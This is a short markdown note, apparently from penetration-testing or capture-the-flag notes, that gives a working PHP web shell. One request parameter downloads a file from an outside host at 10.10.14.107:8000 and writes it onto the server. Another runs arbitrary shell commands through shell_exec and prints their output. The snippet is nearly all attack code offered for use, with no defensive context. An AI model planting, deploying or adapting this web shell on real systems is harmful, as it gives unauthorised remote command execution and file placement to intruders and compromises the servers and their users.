## PHP Shell
*fupload* function is used to upload files to the remote machine\
*fexec* function is used to execute commands on the remote machine
```
<?php 
 if (isset($_REQUEST['fupload'])) {
 file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.107:8000/" . $_REQUEST['fupload']));
 };
 if (isset($_REQUEST['fexec'])) {
 echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
 };
?>
```
